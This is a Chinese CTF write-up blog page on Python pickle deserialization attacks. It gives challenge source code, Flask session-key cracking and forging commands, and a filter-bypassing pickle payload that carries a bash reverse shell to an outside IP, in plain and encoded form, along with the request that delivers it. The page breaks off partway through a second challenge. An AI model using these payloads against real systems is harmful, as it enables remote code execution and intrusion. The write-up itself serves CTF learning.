@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="美团CTF2022-easypickle考点：pickle反序列化，V指令绕过字母 源码 1234567891011121314151617181920212223242526272829303132import base64import picklefrom flask import Flask, sessionimport osimport randomapp &#x3D; Flask(__name__">
+<meta property="og:type" content="article">
+<meta property="og:title" content="几个pickle反序列化">
+<meta property="og:url" content="https://lily2663.github.io/2026/04/06/PICKLE/index.html">
+<meta property="og:site_name" content="lily&#39;epitaph">
+<meta property="og:description" content="美团CTF2022-easypickle考点：pickle反序列化，V指令绕过字母 源码 1234567891011121314151617181920212223242526272829303132import base64import picklefrom flask import Flask, sessionimport osimport randomapp &#x3D; Flask(__name__">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-04-06T12:26:00.000Z">
+<meta property="article:modified_time" content="2026-04-06T12:26:47.445Z">
+<meta property="article:author" content="Li1yZer0">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>几个pickle反序列化</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <li><a href="/">首页</a></li><li><a href="/about/">关于</a></li><li><a href="/archives/">写作</a></li>
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2026/04/03/SSTI/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lily2663.github.io/2026/04/06/PICKLE/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lily2663.github.io/2026/04/06/PICKLE/&text=几个pickle反序列化"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lily2663.github.io/2026/04/06/PICKLE/&title=几个pickle反序列化"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lily2663.github.io/2026/04/06/PICKLE/&is_video=false&description=几个pickle反序列化"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=几个pickle反序列化&body=Check out this article: https://lily2663.github.io/2026/04/06/PICKLE/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lily2663.github.io/2026/04/06/PICKLE/&title=几个pickle反序列化"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lily2663.github.io/2026/04/06/PICKLE/&title=几个pickle反序列化"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lily2663.github.io/2026/04/06/PICKLE/&title=几个pickle反序列化"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lily2663.github.io/2026/04/06/PICKLE/&title=几个pickle反序列化"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lily2663.github.io/2026/04/06/PICKLE/&name=几个pickle反序列化&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BE%8E%E5%9B%A2CTF2022-easypickle"><span class="toc-number">1.</span> <span class="toc-text">美团CTF2022-easypickle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024-jwt-pickle"><span class="toc-number">2.</span> <span class="toc-text">极客大挑战2024-jwt_pickle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0X25%E9%A9%AC%E5%93%88%E9%B1%BC%E5%95%86%E5%BA%97"><span class="toc-number">3.</span> <span class="toc-text">0X25马哈鱼商店</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9A%E5%90%8Ceasypickle"><span class="toc-number">3.1.</span> <span class="toc-text">解法1：同easypickle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">解法2：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%953%EF%BC%9A"><span class="toc-number">3.3.</span> <span class="toc-text">解法3：*</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        几个pickle反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">lily'epitaph</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2026-04-06T12:26:00.000Z" itemprop="datePublished">2026-04-06</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="美团CTF2022-easypickle"><a href="#美团CTF2022-easypickle" class="headerlink" title="美团CTF2022-easypickle"></a>美团CTF2022-easypickle</h1><p>考点：pickle反序列化，V指令绕过字母</p>
+<p>源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">2</span>).<span class="built_in">hex</span>()<span class="comment">#随机生成4字符的字符串//jwt4key.py，然后利用生成的key字典在jwt-unsign进行爆破：一份字典不行就多份</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;user&#x27;</span>):</span><br><span class="line">        session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;&#x27;</span>.join(random.choices(<span class="string">&quot;admin&quot;</span>, k=<span class="number">5</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello &#123;&#125;!&#x27;</span>.<span class="built_in">format</span>(session[<span class="string">&#x27;user&#x27;</span>])</span><br><span class="line"><span class="comment">#session得是admin</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;&lt;script&gt;alert(&#x27;Access Denied&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a = base64.b64decode(session.get(<span class="string">&#x27;ser_data&#x27;</span>)).replace(<span class="string">b&quot;builtin&quot;</span>, <span class="string">b&quot;BuIltIn&quot;</span>).replace(<span class="string">b&quot;os&quot;</span>, <span class="string">b&quot;Os&quot;</span>).replace(<span class="string">b&quot;bytes&quot;</span>, <span class="string">b&quot;Bytes&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;i&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;o&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;b&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">                <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;R i o b is forbidden&quot;</span>)</span><br><span class="line">            pickle.loads(base64.b64decode(session.get(<span class="string">&#x27;ser_data&#x27;</span>)))<span class="comment">#利用点前的过滤绕过，构造payload时不包含R i o b。可以利用这个大小写替换规则</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>
+
+<p>首先爆破jwt的sign</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">file_path=<span class="string">&#x27;./key2.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">99999</span>):</span><br><span class="line">        key = os.urandom(<span class="number">2</span>).<span class="built_in">hex</span>()</span><br><span class="line">        f.write(<span class="string">&quot;\&quot;&#123;&#125;\&quot;\n&quot;</span>.<span class="built_in">format</span>(key))</span><br></pre></td></tr></table></figure>
+
+<p>在当前目录生成key2.txt，其中有99999个不同的4字符字符串</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">格式：</span><br><span class="line">flask-unsign --unsign --cookie &quot;xxx&quot; --wordlist &quot;&quot;</span><br><span class="line"></span><br><span class="line">flask-unsign --unsign --cookie &quot;eyJ1c2VyIjoiYW5hZGQifQ.ac0SKw.zevd2W7NNraddZAnkV0xp0UcvPg&quot; --wordlist &quot;C:\Users\lilyzero207\Desktop\pickle\key2.txt&quot;</span><br><span class="line"></span><br><span class="line">得到4eed</span><br></pre></td></tr></table></figure>
+
+<p>伪造格式：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;username&#x27;:&#x27;admin&#x27;,&#x27;is_admin&#x27;:True&#125;&quot; --secret &#x27;your_secret_key&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>pickle构造：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">            a = base64.b64decode(session.get(<span class="string">&#x27;ser_data&#x27;</span>)).replace(<span class="string">b&quot;builtin&quot;</span>, <span class="string">b&quot;BuIltIn&quot;</span>).replace(<span class="string">b&quot;os&quot;</span>, <span class="string">b&quot;Os&quot;</span>).replace(<span class="string">b&quot;bytes&quot;</span>, <span class="string">b&quot;Bytes&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;i&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;o&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;b&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">                <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;R i o b is forbidden&quot;</span>)</span><br><span class="line">            pickle.loads(base64.b64decode(session.get(<span class="string">&#x27;ser_data&#x27;</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>session中存在ser_data,base64解码后会对其中一些内容进行替换，</p>
+<p>如果还存在R i o b就waf</p>
+<p>一个常规的构造：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一个典中典的</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;</span></span><br><span class="line"><span class="string">pickle.loads(opcode)</span></span><br></pre></td></tr></table></figure>
+
+<p>这里因为os会被识别并且置换为Os</p>
+<p>cos不用变</p>
+<p>最后的o.可以处理为os.绕过</p>
+<p>无论命令执行还是反弹shell都会利用到其中的字母</p>
+<p>于是想到V这个指令可以处理unicode编码</p>
+<p>开新进程：</p>
+<ul>
+<li><strong>Syntax:</strong> <code>bash -c &#39;command_string&#39; [arg0 arg1 arg2 ...]</code></li>
+</ul>
+<p>bash -c “bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.109.70.144&#x2F;2333 0&gt;&amp;1”</p>
+<p>将其</p>
+<p>网站：<a target="_blank" rel="noopener" href="https://www.mklab.cn/utils/unicode">https://www.mklab.cn/utils/unicode</a></p>
+<p>编码，反弹shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">opcode= <span class="string">b&quot;&quot;&quot;(S&#x27;key1&#x27;</span></span><br><span class="line"><span class="string">S&#x27;val1&#x27;</span></span><br><span class="line"><span class="string">dS&#x27;vul&#x27;</span></span><br><span class="line"><span class="string">(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">V\u0062\u0061\u0073\u0068\u0020\u002d\u0063\u0020\u0022\u0062\u0061\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0034\u0037\u002e\u0031\u0030\u0039\u002e\u0037\u0030\u002e\u0031\u0034\u0034\u002f\u0032\u0033\u0033\u0033\u0020\u0030\u003e\u0026\u0031\u0022</span></span><br><span class="line"><span class="string">os.&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode).decode())</span><br></pre></td></tr></table></figure>
+
+<p>最后：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;user&#x27;:&#x27;admin&#x27;,&#x27;ser_data&#x27;:&#x27;KFMna2V5MScKUyd2YWwxJwpkUyd2dWwnCihjb3MKc3lzdGVtClZcdTAwNjJcdTAwNjFcdTAwNzNcdTAwNjhcdTAwMjBcdTAwMmRcdTAwNjNcdTAwMjBcdTAwMjJcdTAwNjJcdTAwNjFcdTAwNzNcdTAwNjhcdTAwMjBcdTAwMmRcdTAwNjlcdTAwMjBcdTAwM2VcdTAwMjZcdTAwMjBcdTAwMmZcdTAwNjRcdTAwNjVcdTAwNzZcdTAwMmZcdTAwNzRcdTAwNjNcdTAwNzBcdTAwMmZcdTAwMzRcdTAwMzdcdTAwMmVcdTAwMzFcdTAwMzBcdTAwMzlcdTAwMmVcdTAwMzdcdTAwMzBcdTAwMmVcdTAwMzFcdTAwMzRcdTAwMzRcdTAwMmZcdTAwMzJcdTAwMzNcdTAwMzNcdTAwMzNcdTAwMjBcdTAwMzBcdTAwM2VcdTAwMjZcdTAwMzFcdTAwMjIKb3Mu&#x27;&#125;&quot; --secret &quot;4eed&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>8888-c5518072-a0b6-48e6-8106-97a3e771208e.challenge.ctfplus.cn</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=.eJyVkb0OgjAUhd-lsxPExU1JMNK0AypEFlO5JlILMQqp1vjuotySFHVw-nrPub_pnTSX_ZlMiICyqMiItNEWRC1aiYasEl4yZsucrm_gbVJ9jfTp-HpDqqugOMidz2juKwPzpA5UlsNqqrmMkGFHwzE-vMnkrGMZo85dva__t49ydS_BOBvk2z1tXYL9M9c37n7cuPUMfWYAdZxnQiTmGzXwwfU_6mKX_bwIyb_T3md-3G_7ywVt_60hjycxl7Wg.acz2nA.cnFiMRu6Pj6uK91H7f8-5MVfiHA</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure>
+
+<p>在vps弹到shell，命令执行即可</p>
+<h1 id="极客大挑战2024-jwt-pickle"><a href="#极客大挑战2024-jwt-pickle" class="headerlink" title="极客大挑战2024-jwt_pickle"></a>极客大挑战2024-jwt_pickle</h1><p>考点：算法混淆攻击+pickle反序列化getshell</p>
+<p>源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template,redirect<span class="comment">#??ssti</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,static_folder=<span class="string">&quot;static&quot;</span>,template_folder=<span class="string">&quot;templates&quot;</span>)</span><br><span class="line"></span><br><span class="line">privateKey=<span class="built_in">open</span>(<span class="string">&quot;./private.pem&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">publicKey=<span class="built_in">open</span>(<span class="string">&quot;./public.pem&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">characters = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line">adminPassword = <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>))<span class="comment">#随机的18字符串，往后看</span></span><br><span class="line">user_list=&#123;<span class="string">&quot;admin&quot;</span>:adminPassword&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method==<span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username=request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password=request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (username==<span class="literal">None</span>)|(password==<span class="literal">None</span>)|(username <span class="keyword">in</span> user_list):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">        user_list[username]=password</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="comment">#注册获取用户</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method==<span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (username == <span class="literal">None</span>) | (password == <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> user_list:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;please register first&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> user_list[username] !=password:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;your password is not right&quot;</span></span><br><span class="line"></span><br><span class="line">        ss=&#123;<span class="string">&quot;username&quot;</span>:username,<span class="string">&quot;password&quot;</span>:hashlib.md5(password.encode()).hexdigest(),<span class="string">&quot;is_admin&quot;</span>:<span class="literal">False</span>&#125;</span><br><span class="line">        <span class="keyword">if</span> username==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            ss[<span class="string">&quot;is_admin&quot;</span>]=<span class="literal">True</span></span><br><span class="line">            <span class="comment">#此处可知密码即用户名的md5值，因为admin的密码难求，往后看</span></span><br><span class="line">            ss.update(introduction=base64.b64encode(pickle.dumps(<span class="string">&quot;1ou_Kn0w_80w_to_b3c0m3_4dm1n?&quot;</span>)).decode())</span><br><span class="line">		<span class="comment">#introduction需要传入base64数据</span></span><br><span class="line">        token=jwt.encode(ss,privateKey,algorithm=<span class="string">&#x27;RS256&#x27;</span>)</span><br><span class="line">	<span class="comment">#每个用户注册登录后得到一个rs256加密的token</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>,<span class="number">200</span>,&#123;<span class="string">&quot;Set-Cookie&quot;</span>:<span class="string">&quot;Token=&quot;</span>+token.decode()&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    token=request.headers.get(<span class="string">&quot;Cookie&quot;</span>)[<span class="number">6</span>:]</span><br><span class="line">    <span class="built_in">print</span>(token)</span><br><span class="line">    <span class="keyword">if</span> token ==<span class="literal">None</span>:</span><br><span class="line">        redirect(<span class="string">&quot;login&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        real= jwt.decode(token, publicKey, algorithms=[<span class="string">&#x27;HS256&#x27;</span>, <span class="string">&#x27;RS256&#x27;</span>])<span class="comment">###hs256，rs256，混淆算法</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span 